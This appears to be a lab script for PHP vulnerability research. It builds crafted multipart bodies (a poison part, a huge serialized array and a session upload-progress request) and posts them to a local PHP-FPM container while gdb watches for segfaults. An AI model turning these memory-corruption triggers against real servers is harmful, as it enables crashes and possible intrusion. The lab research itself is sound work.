#!/usr/bin/env bash
# E1: minimal B (progress + file part only) against dangling decoder.
set -u
SID="f2sexp0000000000000000000000004"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)

python3 - "$TMP" <<'PYEOF'
import sys
B = b"----f2sexp0000000000"
def part(n, b, fn=None):
    d = f'Content-Disposition: form-data; name="{n}"'
    if fn is not None: d += f'; filename="{fn}"'
    return b"--"+B+b"\r\n"+d.encode()+b"\r\n\r\n"+b+b"\r\n"
open(sys.argv[1]+"/poison","wb").write(part("poison", b"65536") + b"--"+B+b"--\r\n")
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
open(sys.argv[1]+"/fatal","wb").write(part("filler", b"Q"*4000000) + part("data", b"a:%d:{%s}" % (40000, elems)) + b"--"+B+b"--\r\n")
open(sys.argv[1]+"/b","wb").write(part("PHPSESSID", b"f2sexp0000000000000000000000004") + part("PHP_SESSION_UPLOAD_PROGRESS", b"e1") + part("f", b"", fn="a") + b"--"+B+b"--\r\n")
PYEOF

post() {
  python3 - "$1" "$2" "$SID" <<'PYEOF'
import sys, http.client
path, bf, sid = sys.argv[1], sys.argv[2], sys.argv[3]
body = open(bf,"rb").read(); B=b"----f2sexp0000000000"
c = http.client.HTTPConnection("127.0.0.1",18120,timeout=60)
c.request("POST", path, body=body, headers={"Content-Type":f"multipart/form-data; boundary={B.decode()}","Content-Length":str(len(body)),"Cookie":f"PHPSESSID={sid}"})
r=c.getresponse(); print(path, r.status, r.read(40).decode("latin1","replace")[:30]); c.close()
PYEOF
}

docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null"; sleep 1.5
PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1); echo "[i] worker=$PID"
docker cp "$LAB/g8.gdb" f2s-php:/tmp/g8.gdb
docker exec f2s-php sh -c ": > /tmp/e1.out"
docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g8.gdb > /tmp/e1.out 2>&1"
sleep 2.5
post /poison.php "$TMP/poison"; sleep 0.3
post /index.php "$TMP/fatal"; sleep 0.4
post /index.php "$TMP/b"; sleep 0.6
docker exec f2s-php sh -c "grep -aE 'VARTMP|SIGSEGV|^#|rip|x/6gx|0x[0-9a-f]+:' /tmp/e1.out | head -25"
rm -rf "$TMP"
